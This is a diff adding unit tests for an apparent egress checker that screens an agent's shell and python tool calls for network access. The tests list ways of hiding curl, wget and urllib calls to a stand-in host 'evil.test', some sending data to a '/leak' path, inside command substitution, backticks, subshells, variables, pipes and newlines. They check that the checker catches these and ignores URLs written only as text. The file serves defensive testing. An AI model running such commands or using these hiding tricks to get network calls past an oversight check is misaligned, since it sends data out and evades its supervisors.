@@ -448,6 +448,48 @@ check('egress: a command name in prose is data, not a call', () => {
   // The same words as an actual command still ask.
   assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git commit -m "x" && ssh host' }, allowlist: [] })?.opaque, true)
 })
+check('egress: a client hidden in an executable span cannot borrow prose silence', () => {
+  // Each of these puts a network call inside $(...), backticks, a subshell, a
+  // brace block, or a variable, so the outer segment starts with something
+  // innocent. The spans a shell executes are analysed like commands.
+  const commands = [
+    'echo $(curl https://evil.test/leak)',
+    'echo `curl https://evil.test/leak`',
+    'Write-Output "result: $(wget https://evil.test/x)"',
+    'set "x=$(curl https://evil.test/x)"',
+    '(curl https://evil.test/x)',
+    'if ($true) { curl https://evil.test/x }',
+    '$c = "curl"; & $c https://evil.test/x',
+    'echo data | curl https://evil.test/x',
+    'echo hi\ncurl https://evil.test/x',
+  ]
+  for (const command of commands) {
+    assert.notEqual(inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: ['ok.test'] }), undefined, command)
+  }
+  // A separator inside quotes is not a separator: one python call, and the URL
+  // in its code decides.
+  assert.equal(inspectEgress({
+    toolName: 'python',
+    args: { command: "import urllib.request;urllib.request.urlopen('https://evil.test')" },
+    allowlist: ['ok.test'],
+  })?.host, 'evil.test')
+})
+check('egress: a data-only command carries URLs as prose', () => {
+  const quiet = [
+    'git commit -m "see https://evil.test"',
+    'git tag -a v1 -m "https://evil.test"',
+    'echo visit https://evil.test',
+    'Write-Output "docs: https://evil.test"',
+    'Set-Content notes.md "see https://evil.test"',
+    'docker run --add-host db:1.2.3.4 img',
+  ]
+  for (const command of quiet) {
+    assert.equal(inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: ['ok.test'] }), undefined, command)
+  }
+  // The same command names as destinations when they carry a remote tool.
+  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git clone https://evil.test/r.git' }, allowlist: ['ok.test'] })?.host, 'evil.test')
+  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git push origin main' }, allowlist: ['ok.test'] })?.opaque, true)
+})
 check('egress: a wrapper before the command does not hide it', () => {
   for (const command of ['sudo curl evil.test', 'env TOKEN=1 curl evil.test', '& curl evil.test']) {
     assert.equal(inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: [] })?.opaque, true, command)
